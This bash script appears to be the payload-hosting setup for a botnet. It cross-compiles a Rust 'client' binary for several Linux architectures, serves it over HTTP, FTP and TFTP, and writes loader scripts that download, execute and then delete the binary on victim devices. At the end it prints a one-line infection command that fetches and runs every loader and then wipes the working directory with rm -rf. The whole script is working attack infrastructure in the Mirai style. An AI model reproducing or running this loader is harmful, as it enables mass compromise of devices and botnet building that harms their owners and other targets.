#!/bin/bash

# Check if the IP address and Rust project directory are provided
if [ "$#" -lt 3 ]; then
    echo -e "\x1b[0;31mIncorrect Usage!"
    echo -e "\x1b[0;32mUsage: bash $0 <RUST_PROJECT_DIRECTORY> <IP_ADDR> <BOT_PORT> \x1b[0m"
    exit 1
fi

rust_project=$1
ip=$2
bot_port=$3

read -r -p "Download architectures? Y/n: " download_archs

# Define Rust target architectures
rust_archs=(
    "aarch64-unknown-linux-gnu"
    "arm-unknown-linux-gnueabi"
    #"mips-unknown-linux-gnu"
    #"mipsel-unknown-linux-gnu" # need to figure out how to compile rust standard library for these
    "i686-unknown-linux-gnu"
    "x86_64-unknown-linux-gnu"
)

apt-get update -y

# Remove existing binaries
rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*

# Install cross compilation tool chain
apt-get install gcc -y
apt-get install gcc-aarch64-linux-gnu -y
apt-get install gcc-arm-linux-gnueabi -y
apt-get install gcc-i686-linux-gnu -y
apt-get install gcc-x86-64-linux-gnux32 -y
apt-get install gcc-mips-linux-gnu -y
apt-get install gcc-mipsel-linux-gnu -y

if [[ "${download_archs,,}" == "y" ]]; then
    echo "Downloading Rust target architectures"
    for arch in "${rust_archs[@]}"; do
        rustup target add "$arch"
    done
    echo "Rust targets downloaded."
fi

# Change to Rust project directory
cd "$rust_project" || exit 1

# Cross compile for each architecture
for arch in "${rust_archs[@]}"; do
    cargo build --release --target="$arch" --bin client
done

echo "Cross compiling done. Setting up servers..."

# Server setup for Ubuntu
apt-get install apache2 -y
service apache2 start
apt-get install xinetd tftpd tftp -y
apt-get install vsftpd -y
service vsftpd start

mkdir /var/lib/tftpboot
chmod -R 777 /var/lib/tftpboot
sudo chown -R nobody /var/lib/tftpboot

# TFTP server configuration
cat > /etc/xinetd.d/tftp <<'EOF'
# default: off
# description: The tftp server serves files using the trivial file transfer \
#       protocol.  The tftp protocol is often used to boot diskless \
#       workstations, download configuration files to network-aware printers, \
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
EOF
service xinetd start

mkdir /var/ftp

# FTP server configuration
cat > /etc/vsftpd.conf <<EOF
listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address=$ip
listen_port=21
EOF
service vsftpd restart

# Copy binaries to server directories and setup scripts
for arch in "${rust_archs[@]}"; do
    binary_name="client-$arch"
    binary_path="./target/$arch/release/client"
    cp "$binary_path" "/var/www/html/$binary_name"
    cp "$binary_path" "/var/ftp/$binary_name"
    mv "$binary_path" "/var/lib/tftpboot/$binary_name"
done

echo "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh
echo "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh
echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh
echo "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh
echo "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh
echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh
echo "#!/bin/bash" > /var/www/html/bins.sh

for arch in "${rust_archs[@]}"; do
    i="client-$arch"
    echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://$ip/$i; curl -O http://$ip/$i; chmod +x $i; ./$i $ip $bot_port; rm -rf $i" >> /var/www/html/bins.sh
    echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 $ip $i $i; chmod 777 $i ./$i $ip $bot_port; rm -rf $i" >> /var/ftp/ftp1.sh
    echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp $ip -c get $i;cat $i >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh
    echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r $i -g $ip;cat $i >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh
done
# TODO: update badbox to support ip:port args
chmod 777 /var/www/html/bins.sh

service xinetd restart
service apache2 restart
echo "ulimit -n 99999" >> ~/.bashrc

echo -e "\x1b[0;32mSuccessfully cross compiled and set up servers!\x1b[0m"
echo -e "\x1b[0;32mYour link: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://$ip/bins.sh; curl -O http://$ip/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp $ip -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g $ip; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 $ip ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\x1b[0m"
echo ""
